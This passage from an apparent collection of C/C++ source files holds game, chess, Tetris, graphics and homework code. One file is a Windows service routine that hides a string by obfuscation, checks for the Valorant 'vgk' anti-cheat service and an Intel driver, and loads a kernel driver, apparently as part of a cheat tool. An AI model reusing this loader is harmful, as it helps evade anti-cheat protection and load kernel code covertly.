temp;\r\n\r\n        for (int i = 0; i < buffer.size(); i++) {\r\n            if (buffer[i] == '0')\r\n                temp.push_back(0);\r\n            else\r\n                temp.push_back(1);\r\n        }\r\n\r\n        terrain.push_back(temp);\r\n\r\n    }\r\n    in_file.close();\r\n}\r\n\r\nvoid print_terrain(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << (short)terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\nvoid print_los(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\n\r\nvoid print_vector(const std::vector<SB_LINE::Coordinate>& vals) {\r\n\r\n    std::cout << \"(x, y) \";\r\n    for (int i = 0; i < vals.size(); i++) {\r\n        std::cout << \"(\" << vals[i].x << \", \" << vals[i].y << \") \";\r\n    }\r\n    std::cout << \"\\n\";\r\n}\r\n\r\nint main() {\r\n    std::vector<std::vector<char>> terrain;\r\n\r\n    initialize_terrain(terrain, \"infile.txt\");\r\n\r\n    print_terrain(terrain);\r\n    \r\n    std::cout << \"\\n\";\r\n\r\n    std::vector<std::vector<char>> los = SB_LOS::line_of_sight(terrain, 20, 10);\r\n\r\n    print_los(los);\r\n\r\n}\r\n#endif",
    "//utility.cpp by Dan Honeycutt.  This software is public domain.\r\n//You may use this software as you wish.  There is no warranty.\r\n#include \"chess.h\"\r\n\r\n/*********************************************************************\r\nFile contains miscellaneous utility functions\r\n*********************************************************************/\r\n\r\n//====================================================================\r\n//Print() is printf() with a nl appended and an fflush() following.\r\n//====================================================================\r\nvoid Print(const char *fmt, ...) {\r\n  char o_buf[512];\r\n  va_list\tap;\r\n  va_start(ap, fmt);\r\n  vsprintf(o_buf, fmt, ap);\r\n  printf(\"%s\\n\", o_buf);\r\n\tfflush(stdout);\r\n}\r\n\r\n//====================================================================\r\n//Len() is simply strlen().  i have gotten some mystery results using\r\n//strlen() inside a loop construct.\r\n//====================================================================\r\nint Len(const char *pc) {\r\n  int i = 0;\r\n  while (*pc++) i++;\r\n  return i;\r\n}\r\n\r\n//====================================================================\r\n//Val() is equivalent to atoi()  returns numeric value of string\r\n//====================================================================\r\nint Val(const char *pc) {\r\n  int k1 = 0;\r\n  long rv = 0;\r\n  while (isspace((int) *pc)) pc++;\r\n  if (*pc == '-') {\r\n    k1 = TRUE;\r\n    pc++;\r\n  }\r\n  while (isdigit((int) *pc)) {\r\n    rv = rv*10;\r\n    rv += *pc - '0';\r\n    pc++;\r\n  }\r\n  if (k1) rv = -rv;\r\n  return rv;\r\n}\r\n\r\n//====================================================================\r\n//UpdateHistory() updates history heuristic and killer moves\r\n//====================================================================\r\nvoid UpdateHistory(int move, int ply, int depth) {\r\n  int i1;\r\n  unsigned *hh;\r\n  if (!mv_capro(move)) {  //only non-captures go in history heuristic\r\n    i1 = move & 4095;\r\n    hh = color ? hh_black : hh_white;\r\n    hh[i1] += depth * depth;\r\n    if (hh[i1] > hh_max) hh_max = hh[i1];\r\n    //update killers\r\n    if (tree[ply].killer1 != move) {\r\n      tree[ply].killer2 = tree[ply].killer1;\r\n      tree[ply].killer1 = move;\r\n    }\r\n  }\r\n}\r\n\r\n\r\n//====================================================================\r\n//MateIn() converts ply based mate scores to number of moves:\r\n//  0 = No mate\r\n//  1 = mate in 1  (30999 w/DEAD = 31000)\r\n// -1 = mated in 1 (-30998)\r\n//  2 = mate in 2  (30997) etc.\r\n//====================================================================\r\nint MateIn(int val) {\r\n  if (abs_val(val) < MATE) return 0;\r\n  if (val > MATE) return ((DEAD - val + 1) >> 1);\r\n  else return (-((DEAD + val) >> 1));\r\n}\r\n\r\n\r\n//====================================================================\r\n//PVUpdate() & PVDisplay()  manage the principal variation.  nih - the\r\n//method to update the pv is from Faile (Adrien Regimbald).  as we\r\n//ascend the search tree the move played (X) is saved in the main\r\n//diagonal of a square array:\r\n//       |X    |          |X    |          |X    |\r\n// ply 1 |     |    ply 2 |  X  |    ply 3 |  X  |\r\n//       |     |          |     |          |    X|\r\n//as we find pv moves (P) and descend we copy the row (of length len)\r\n//to the row below and increment the length:\r\n//       |X    |          |X    |          |P P P|\r\n// ply 3 |  X  |    ply 2 |  P P|    ply 1 |     |\r\n// len=1 |    P|    len=2 |     |    len=3 |     |\r\n//a companion 1-dimensional array keeps track of the length.\r\n//====================================================================\r\nvoid PVDisplay(int score, int mark) {\r\n  int val, j;\r\n  char rm[10];\r\n\r\n  if (!xb_post) return;\r\n  // Time is reported to the nearest centisecond:\r\n  int et = (int)((Now() - tc_start + 5)/10);\r\n\r\n  //format the root move\r\n  strcpy(rm, Move2XBoard(pv_move[0][0]));\r\n  j = Len(rm);\r\n  if (mark) {\r\n    if (mark > 0) rm[j] = '!';\r\n    else rm[j] = '?';\r\n    j++;\r\n    rm[j]=0;\r\n  }\r\n  //simon bases mate scores on the value MATE.  winboard expects\r\n  //score based on 32767 (INF).  I like to keep MATE and INF well \r\n  //apart to avoid unexpected consequences.  Here we adjust the \r\n  //score to winboard expected value.\r\n  if (abs_val(score) > DEAD) {\r\n    if (score > 0) score += 32767-MATE;\r\n    else score -= 32767-MATE;\r\n  }\r\n  printf(\"%d %d %ld %ld %s\", iter, score, et, nodes, rm);\r\n  \r\n  \r\n  \r\n  for (j=1; j<pv_len[0]; j++) {\r\n    printf(\" %s\", Move2XBoard(pv_move[0][j]));\r\n  }\r\n  printf(\"\\n\");    //send \\n & flush buffer\r\n  fflush(stdout);\r\n} //PVDisplay();\r\n\r\nvoid PVUpdate(int ply, int move) {\r\n  int j;\r\n  pv_move[ply][ply] = move;\r\n  pv_len[ply] = pv_len[ply+1];\r\n  for (j=ply+1; j<pv_len[ply+1]; j++) {\r\n    pv_move[ply][j] = pv_move[ply+1][j];\r\n  }\r\n}\r\n\r\n//====================================================================\r\n//Draw3Rep() returns TRUE if the position is a draw by 3 repetition.\r\n//To repeat a position you have to go somewhere and come back so a\r\n//minimum of 9 positions (g_ply >= 8) are required. following a\r",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nvoid somando();\nint fibonacci(int n);\nint busca();\nstring inverte();\n\nint main() {\n\tsomando(); //Q01\n\tcout << endl;\n\tbusca(); //Q02\n\tcout << endl;\n\tinverte(); //Q05\n\n\treturn 0;\n}\n\n\n// Questao 01\nvoid somando() {\n\tint i = 13, k = 0, s = 0;\n\twhile (k < i) {\n\t\tk += 1;\n\t\ts += k;\n\t}\n\tcout << \"O resultado da soma e: \" << s << endl;\n}\n\n// Questao 02\nint fibonacci(int n) {\n\tif (n <= 1)\n\t\treturn n;\n\telse\n\t\treturn fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nint busca() {\n\tvector<int> fib;\n\tint indice_encontrado = -1;\n\tint procurado;\n\n\tcout << \"Digite o numero a ser buscado: \";\n\tcin >> procurado;\n\n\tfor (int i = 0; i < 20; i++) {\n\t\tfib.push_back(fibonacci(i));\n\t\tif (fib[i] == procurado) {\n\t\t\tindice_encontrado = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (indice_encontrado != -1) {\n\t\tcout << \"Numero encontrado na sequencia na posicao \" << indice_encontrado << endl;\n\t}\n\telse {\n\t\tcout << \"Numero nao encontrado na sequencia\" << endl;\n\t}\n\n\treturn indice_encontrado;\n}\n\n// Questao 05\nstring inverte() {\n\tstring entrada, saida;\n\tcout << \"Insira a string que sera invertida: \";\n\tcin >> entrada;\n\tfor (int i = entrada.size(); i >= 0; i--) {\n\t\tsaida += entrada[i];\n\t}\n\tcout << \"A string invertida e: \" <<  saida << endl;\n\treturn saida;\n}\n",
    "#include \"service.hpp\"\r\n#include \"xhackorx.hpp\"\r\n\r\nbool ExistOtherService(SC_HANDLE service_manager) {\r\n\tDWORD spaceNeeded = 0;\r\n\tDWORD numServices = 0;\r\n\tif (!EnumServicesStatus(service_manager, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &spaceNeeded, &numServices, 0) && GetLastError() != ERROR_MORE_DATA) {\r\n\t\treturn true;\r\n\t}\r\n\tspaceNeeded += sizeof(ENUM_SERVICE_STATUSA);\r\n\tLPENUM_SERVICE_STATUSA buffer = (LPENUM_SERVICE_STATUSA)new BYTE[spaceNeeded];\r\n\r\n\tif (EnumServicesStatus(service_manager, SERVICE_DRIVER, SERVICE_STATE_ALL, buffer, spaceNeeded, &spaceNeeded, &numServices, 0)) {\r\n\t\tfor (DWORD i = 0; i < numServices; i++) {\r\n\t\t\tENUM_SERVICE_STATUSA service = buffer[i];\r\n\t\t\tSC_HANDLE service_handle = OpenService(service_manager, service.lpServiceName, SERVICE_QUERY_CONFIG);\r\n\t\t\tif (service_handle) {\r\n\t\t\t\tLPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)new BYTE[8096]; //8096 = max size of QUERY_SERVICE_CONFIGA\r\n\t\t\t\tDWORD needed = 0;\r\n\t\t\t\tif (QueryServiceConfig(service_handle, config, 8096, &needed)) {\r\n\t\t\t\t\tif (strstr(config->lpBinaryPathName, intel_driver::driver_name)) {\r\n\t\t\t\t\t\tdelete[] buffer;\r\n\t\t\t\t\t\tCloseServiceHandle(service_handle);\r\n\t\t\t\t\t\treturn false;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t}\r\n\t\t\t\tCloseServiceHandle(service_handle);\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\t\tdelete[] buffer;\r\n\t\treturn false; //no equal services we can continue\r\n\t}\r\n\tdelete[] buffer;\r\n\treturn true;\r\n\r\n}\r\n\r\nbool ExistsValorantService(SC_HANDLE service_manager) {\r\n\tDWORD spaceNeeded = 0;\r\n\tDWORD numServices = 0;\r\n\tif (!EnumServicesStatus(service_manager, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &spaceNeeded, &numServices, 0) && GetLastError() != ERROR_MORE_DATA) {\r\n\t\treturn true;\r\n\t}\r\n\tspaceNeeded += sizeof(ENUM_SERVICE_STATUSA);\r\n\tLPENUM_SERVICE_STATUSA buffer = (LPENUM_SERVICE_STATUSA)new BYTE[spaceNeeded];\r\n\r\n\tif (EnumServicesStatus(service_manager, SERVICE_DRIVER, SERVICE_STATE_ALL, buffer, spaceNeeded, &spaceNeeded, &numServices, 0)) {\r\n\t\tfor (DWORD i = 0; i < numServices; i++) {\r\n\t\t\tENUM_SERVICE_STATUSA service = buffer[i];\r\n\t\t\tif (strstr(service.lpServiceName, XorString(\"vgk\"))) \r\n\t\t\t{\r\n\t\t\t\tif ((service.ServiceStatus.dwCurrentState == SERVICE_RUNNING || service.ServiceStatus.dwCurrentState == SERVICE_START_PENDING)) \r\n\t\t\t\t{\r\n\t\t\t\t\treturn true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t}\r\n\t\tdelete[] buffer;\r\n\t\treturn false; //no valorant service found\r\n\t}\r\n\tdelete[] buffer;\r\n\treturn true;\r\n}\r\n\r\nbool service::RegisterAndStart(const std::string& driver_path)\r\n{\r\n\tconst std::string driver_name = std::filesystem::path(driver_path).filename().string();\r\n\tconst SC_HANDLE sc_manager_handle = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);\r\n\r\n\tif (!sc_manager_handle) {\r\n\t\treturn false;\r\n\t}\r\n\tif (ExistOtherService(sc_manager_handle)) {\r\n\t\treturn false;\r\n\t}\r\n\r\n\tif (ExistsValorantService(sc_manager_handle)) {\r\n\t\treturn false;\r\n\t}\r\n\r\n\tSC_HANDLE service_handle = CreateService(sc_manager_handle, driver_name.c_str(), driver_name.c_str(), SERVICE_START | SERVICE_STOP | DELETE, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driver_path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);\r\n\r\n\tif (!service_handle)\r\n\t{\r\n\t\tservice_handle = OpenService(sc_manager_handle, driver_name.c_str(), SERVICE_START);\r\n\r\n\t\tif (!service_handle)\r\n\t\t{\r\n\t\t\tCloseServiceHandle(sc_manager_handle);\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n\r\n\tconst bool result = StartService(service_handle, 0, nullptr);\r\n\r\n\tCloseServiceHandle(service_handle);\r\n\tCloseServiceHandle(sc_manager_handle);\r\n\tif (!result) {\r\n\t}\r\n\treturn result;\r\n}\r\n\r\nbool service::StopAndRemove(const std::string& driver_name)\r\n{\r\n\tconst SC_HANDLE sc_manager_handle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);\r\n\r\n\tif (!sc_manager_handle)\r\n\t\treturn false;\r\n\r\n\tconst SC_HANDLE service_handle = OpenService(sc_manager_handle, driver_name.c_str(), SERVICE_STOP | DELETE);\r\n\r\n\tif (!service_handle)\r\n\t{\r\n\t\tCloseServiceHandle(sc_manager_handle);\r\n\t\treturn false;\r\n\t}\r\n\r\n\tSERVICE_STATUS status = { 0 };\r\n\tconst bool result = ControlService(service_handle, SERVICE_CONTROL_STOP, &status) && DeleteService(service_handle);\r\n\r\n\tCloseServiceHandle(service_handle);\r\n\tCloseServiceHandle(sc_manager_handle);\r\n\r\n\treturn result;\r\n}\r\n",
    "#include \"node_3.h\"\n\n#include <iostream>\n\nnamespace tng_v1 {\n\nNode3::Node3() {\n    std::cout << \"Node3::Node3 ...\" << std::endl;\n    m_dataCenterOutput = m_outputDataCenter.get_future().share();\n}\n\nvoid Node3::run() {\n    std::cout << \"Node3::run ...\" << std::endl;\n\n    for (const auto& dci : m_dataCenterInput) {\n        if (dci.valid()) {\n            dci.wait();\n        }\n    }\n\n    if (m_dataCenterInput.size() > 0) {\n        std::shared_ptr<DataCenter> dataCenter = m_dataCenterInput[0].get();\n        std::shared_ptr<Node1OutputData> inputData = dataCenter->node1OutputData;\n        if (inputData) {\n            if (dataCenter->node3OutputData == nullptr) {\n                dataCenter->node3OutputData = std::shared_ptr<Node3OutputData>(new Node3OutputData);\n            }\n            dataCenter->node3OutputData->d = inputData->c + 10;\n            dataCenter->node3OutputData->e = inputData->c + 20;\n            std::cout << \"Node3 c: \" << dataCenter->node3OutputData->d\n                      << \" e: \" << dataCenter->node3OutputData->e\n                      << \" | c: \" << inputData->c << std::endl;\n        }\n        \n        m_outputDataCenter.set_value(dataCenter);\n    }\n}\n\n}  // namespace tng_v1",
    "#include \"Environment.h\"\r\n\r\nEnvironment::Environment() {\r\n    // Parse piece moves\r\n    std::ifstream file(\"PieceMoves.txt\");\r\n    std::string line;\r\n    char pieceName;\r\n    int pieceLines, actionCount, action;\r\n\r\n    for (int i = 0; i < 7; i++) { // 7 pieces\r\n        file >> pieceName >> pieceLines;\r\n        for (int j = 0; j < pieceLines; j++) {\r\n            file >> actionCount;\r\n            std::vector<Action> actions;\r\n            for (int k = 0; k < actionCount; k++) {\r\n                file >> action;\r\n                actions.push_back(static_cast<Action>(action));\r\n            }\r\n            pieceMoves[pieceName].push_back(actions);\r\n        }\r\n    }\r\n\r\n    pieceRotations['I'] = I_ROTATIONS;\r\n    pieceRotations['J'] = J_ROTATIONS;\r\n    pieceRotations['L'] = L_ROTATIONS;\r\n    pieceRotations['O'] = O_ROTATIONS;\r\n    pieceRotations['S'] = S_ROTATIONS;\r\n    pieceRotations['T'] = T_ROTATIONS;\r\n    pieceRotations['Z'] = Z_ROTATIONS;\r\n}\r\n\r\nstd::vector<TetrisState> Environment::getSuccessorStates(const TetrisState &state) {\r\n    std::vector<TetrisState> states;\r\n    auto actions = pieceMoves[state.currentPiece];\r\n    for (const auto& action : actions) {\r\n        if (state.holdUsed && std::find(action.begin(), action.end(), Action::HOLD) != action.end()) {\r\n            continue;\r\n        }\r\n        TetrisState newState = applyAction(state, action);\r\n        newState.actions = action;\r\n        states.push_back(newState);\r\n    }\r\n    return states;\r\n}\r\n\r\nTetrisState Environment::applyAction(const TetrisState &state, const std::vector<Action> &actions) {\r\n    TetrisState newState = state;\r\n    newState.holdUsed = false;\r\n\r\n    int move_counter {0};\r\n    int rotation_counter {0};\r\n    for (auto action : actions) {\r\n        if (action == Action::LEFT) {\r\n            move_counter--;\r\n        } else if (action == Action::RIGHT) {\r\n            move_counter++;\r\n        } else if (action == Action::CW) {\r\n            rotation_counter++;\r\n        } else if (action == Action::CCW) {\r\n            rotation_counter--;\r\n        } else if (action == Action::HOLD) {\r\n            newState.hold();\r\n            return newState;\r\n        }\r\n    }\r\n\r\n    newState.move(pieceRotations[newState.currentPiece][rotation_counter % pieceRotations[newState.currentPiece].size()], move_counter);\r\n    return newState;\r\n}\r\n\r\ndouble Environment::evaluateState(const TetrisState &state) {\r\n    double score {0};\r\n    int holes {0};\r\n    int aggHeight {0};\r\n    int bumpiness {0};\r\n    std::vector<int> peaks;\r\n\r\n    for (int col = 0; col < 10; col++) {\r\n        int peak = 0;\r\n        for (int row = 0; row < 20; row++) {\r\n            if (state.board[row][col]) {\r\n                if ((20 - row) > peak)\r\n                    peak = 20 - row;\r\n            } else {\r\n                if ((20 - row) < peak) {\r\n                    holes += peak - (20 - row);\r\n                }\r\n            }\r\n        }\r\n        aggHeight += peak;\r\n        peaks.push_back(peak);\r\n    }\r\n\r\n    for (int i = 0; i < peaks.size() - 2; i++) {\r\n        bumpiness += abs(peaks[i] - peaks[i + 1]);\r\n    }\r\n\r\n    const double a = 0.35; // Agg Height\r\n    const double b = 1.1; // Lines Cleared\r\n    const double c = 10.0; // Holes\r\n    const double d = 1.5; // Bumpiness\r\n\r\n    double scores[5] = {1, -5, -4, -3, 40};\r\n\r\n    score = -a * aggHeight + b * scores[state.linesCleared] - c * holes - d * bumpiness;\r\n    int lastTwo = peaks[peaks.size() - 2] - peaks[peaks.size() - 1];\r\n    if (lastTwo >= 4) {\r\n        score += 3.5F;\r\n    }\r\n    score -= peaks[9] * 2;\r\n    return score;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"d3d11_shader.h\"\n#include <d3dcompiler.h>\n\nstatic D3D11* d3d11 = D3D11::GetSingleton();\n\nD3D11_Shader* D3D11_Shader::Create()\n{\n\tD3D11_Shader* shader = new D3D11_Shader();\n\treturn shader;\n}\nbool D3D11_Shader::LoadVertex(const char* filename, bool compile)\n{\n    if (!compile)\n        if (!Read(filename, &vs_blob))\n            return false;\n\n    if (!Read(filename, vertex_data))\n        return false;\n\n\treturn true;\n}\nbool D3D11_Shader::CompileVertex()\n{\n    if (vertex_data.empty())\n    {\n        printf(\"vertex data is empty\\n\");\n        return false;\n    }\n\n    if (!CompileShader(vertex_data, \"main\", \"vs_4_0\", &vs_blob))\n        return false;\n\n    vertex_data.clear();\n\n\treturn true;\n}\nbool D3D11_Shader::LoadPixel(const char* filename, bool compile)\n{\n    if (!compile)\n        if (!Read(filename, &ps_blob))\n            return false;\n\n    if (!Read(filename, pixel_data))\n        return false;\n\n    return true;\n}\nbool D3D11_Shader::CompilePixel()\n{\n    if (pixel_data.empty())\n    {\n        printf(\"pixel data is empty\\n\");\n        return false;\n    }\n\n    if (!CompileShader(pixel_data, \"main\", \"ps_4_0\", &ps_blob))\n        return false;\n\n    pixel_data.clear();\n\n    return true;\n}\nbool D3D11_Shader::Read(const char* filename, std::vector<unsigned char>& data)\n{\n    if (std::string(filename).empty())\n    {\n        printf(\"filename is empty\\n\");\n        return false;\n    }\n\n\tstd::FILE* file = std::fopen(filename, \"rb\");\n    if (file)\n    {\n        // seek file to end\n        std::fseek(file, 0, SEEK_END);\n        // get size and resize vector\n        data.resize(std::ftell(file));\n        // rewind file to back\n        std::rewind(file);\n\n        // read file\n        std::fread(&data[0], 1, data.size(), file);\n        // close file\n        std::fclose(file);\n    }\n    else\n    {\n        printf(\"file read error\\n\");\n        return false;\n    }\n\n    return true;\n}\nbool D3D11_Shader::CompileShader(std::vector<unsigned char>& data, std::string entry_point, std::string profile, ID3DBlob** blob)\n{\n    if (data.empty())\n    {\n        printf(\"data is empty\\n\");\n        return false;\n    }\n\n    if (entry_point.empty())\n    {\n        printf(\"entry point is empty\\n\");\n        return false;\n    }\n\n    if (profile.empty())\n    {\n        printf(\"profile is empty\\n\");\n        return false;\n    }\n\n    *blob = nullptr;\n\n    UINT flags = D3DCOMPILE_ENABLE_STRICTNESS;\n#if defined(_DEBUG)\n    flags |= D3DCOMPILE_DEBUG;\n#endif\n\n    const D3D_SHADER_MACRO defines[] =\n    {\n        \"EXAMPLE_DEFINE\", \"1\",\n        NULL, NULL\n    };\n\n    ID3DBlob* shaderBlob = nullptr;\n    ID3DBlob* errorBlob = nullptr;\n    if (FAILED(D3DCompile(data.data(),\n                          data.size(),\n                          NULL,\n                          defines,\n                          D3D_COMPILE_STANDARD_FILE_INCLUDE,\n                          entry_point.c_str(),\n                          profile.c_str(),\n                          flags,\n                          0,\n                          &shaderBlob,\n                          &errorBlob)))\n    {\n        if (errorBlob)\n        {\n            printf(\"compile failed\\n\");\n            printf(\"%s\\n\", (char*)errorBlob->GetBufferPointer());\n            return false;\n        }\n    }\n\n    *blob = shaderBlob;\n    return true;\n}\nbool D3D11_Shader::SaveVertex(const char* filename)\n{\n    if (!Write(filename, vs_blob))\n        return false;\n\n    return true;\n}\nbool D3D11_Shader::SavePixel(const char* filename)\n{\n    if (!Write(filename, ps_blob))\n        return false;\n\n    return true;\n}\nbool D3D11_Shader::Write(const char* filename, ID3DBlob* blob)\n{\n    if (std::string(filename).empty())\n    {\n        printf(\"filename is empty\\n\");\n        return false;\n    }\n\n    if (blob == nullptr)\n    {\n        printf(\"blob is empty\\n\");\n        return false;\n    }\n\n    std::FILE* file = std::fopen(filename, \"wb\");\n    if (file)\n    {\n        // write file\n        std::fwrite(blob->GetBufferPointer(), 1, blob->GetBufferSize(), file);\n        // close file\n        std::fclose(file);\n    }\n    else\n    {\n        printf(\"file write error\\n\");\n        return false;\n    }\n\n    return true;\n}\nbool D3D11_Shader::CreateVertex()\n{\n    if (!vs_blob)\n    {\n        printf(\"vertex blob is empty\\n\");\n        return false;\n    }\n\n    if (FAILED(d3d11->GetDevice()->CreateVertexShader(vs_blob->GetBufferPointer(),\n                                                      vs_blob->GetBufferSize(),\n                                                      NULL,\n                                                      vertex_shader.GetAddressOf())))\n    {\n        printf(\"create vertex shader failed\\n\");\n        return false;\n    }\n\n    return true;\n}\nbool D3D11_Shader::CreatePixel()\n{\n    if (!vs_blob)\n    {\n        printf(\"vertex blob is empty\\n\");\n        return false;\n    }\n\n    if (FAILED(d3d11->GetDevice()->CreatePixelShader(ps_blob->GetBufferPointer(),\n                                                     ps_blob->GetBufferSize(),\n            ",
    "#include<stdio.h>\r\n#include<math.h>\r\n#include<stdlib.h>//\u5934\u6587\u4ef6 \r\nint i,j,m,n,p,q,k,x,y,order;//\r\nfloat result=0.0; //\u884c\u5217\u5f0f\u7ed3\u679c \r\nfloat determinant(float **a,int order);//\u884c\u5217\u5f0f\u51fd\u6570 \r\nfloat laplace(float **a,int r,int c,int order);//\u62c9\u666e\u62c9\u65af\u5c55\u5f00\u51fd\u6570 \r\nfloat inverse(float **a,int r,int c,int order); //\u9006\u77e9\u9635\u51fd\u6570 \r\nvoid print_inverse(float **a,int order);//\u8f93\u51fa\u9006\u77e9\u9635\u51fd\u6570 \r\nfloat adjoint(float **a,int r,int c,int order);//\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nvoid print_adjoint(float **a,int order);//\u8f93\u51fa\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nint main()\r\n{\r\n    printf(\"-----------------\u77e9\u9635\u8ba1\u7b97\u5668-----------------\\n\");\r\n    printf(\"------\u8bf7\u9009\u62e9\u529f\u80fd\uff1a\uff08\u9009\u62e9\u540e\u8bf7\u6309\u56de\u8f66\u952e\uff09  ----\\n\");\r\n    printf(\"------    0\uff1a\u9000\u51fa                -----------\\n\");\r\n    printf(\"------    1\uff1a\u8f6c\u7f6e\u77e9\u9635            -----------\\n\");\r\n    printf(\"------    2\uff1a\u77e9\u9635\u52a0\u6cd5            -----------\\n\");\r\n    printf(\"------    3\uff1a\u77e9\u9635\u4e58\u6cd5            -----------\\n\");\r\n    printf(\"------    4\uff1a\u77e9\u9635\u884c\u5217\u5f0f          -----------\\n\");\r\n    printf(\"------    5\uff1a\u9006\u77e9\u9635              -----------\\n\");\r\n    printf(\"------    6\uff1a\u4f34\u968f\u77e9\u9635            -----------\\n\");\r\n    printf(\"--------------------------------------------\\n\");//\u5934\u76ee \r\n    do\r\n    {\r\n    \tscanf(\"%d\",&x);//\u9009\u62e9\u9700\u8981\u8fdb\u884c\u7684\u529f\u80fd \r\n    \tswitch(x)\r\n    \t{\r\n    \t\tcase(0):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\\n\");\r\n    \t\t\tprintf(\"\u52a9\u6559\u522b\u5fd8\u4e86\u52a0\u5206\uff08\u4e00\u5b9a\u8981\u52a0\u5206\uff09\\n\"); \r\n    \t\t\tprintf(\"\u8bf7\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n    \t\t\tprintf(\"0:\u5927\u6c14\u52a0\u5206\\n\");\r\n    \t\t\tprintf(\"1:\u5c31\u8fd9\uff1f\uff1f\uff1f\\n\");\r\n    \t\t\tdo\r\n\t\t\t\t{\r\n    \t\t\t  scanf(\"%d\",&y);\r\n    \t\t\t  switch(y) \r\n    \t\t\t  {\r\n    \t\t\t\t  case(0):\r\n    \t\t\t\t  {\r\n\t\t\t\t\t      printf(\"\\n\");\r\n    \t\t\t\t\t  printf(\"\u4e07\u5206\u611f\u8c22\uff0c\u52a9\u6559\u4f60\u6700\u597d\u770b\uff01  (\u70b9\u51fb\u4efb\u610f\u952e<\u522b\u70b9\u7535\u6e90\u952e\u3001num lock\u952e\u3001ctrl\u952e\u3001fn\u952e\u3001\u4e2d\u6587\u72b6\u6001\u4e0b\u7684\u5b57\u6bcd\u952e\u2026\u2026>\u9000\u51fa\u5594)\");\r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t  case(1):\r\n\t\t\t\t\t  {\r\n\t\t\t\t\t\t  printf(\"\u5fd8\u4e86\u52a0\u5206\u5566 \uff08\u545c\u545c\u545c\u6ca1\u6709\u52a0\u5206  # __  #\uff09\\n\");\r\n\t\t\t\t\t\t  printf(\"\u8bf7\u518d\u6b21\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n\t\t\t\t\t\t  printf(\"0\uff1a\u597d\u5427\u7ed9\u4f60\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"1\uff1a\u5c31\u662f\u4e0d\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"\\n\"); \r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t  }\r\n\t\t\t    }\r\n\t\t\t    while(y);//\u5f53\u8f93\u51650\u65f6\u9000\u51fa\uff0c\u5426\u5219\u4e00\u76f4\u5faa\u73af \r\n\t\t    }\r\n\t\t\tbreak;\r\n\t\t\tcase(1):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*m);\r\n\t            int w;\r\n\t            for(w=0;w<m;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            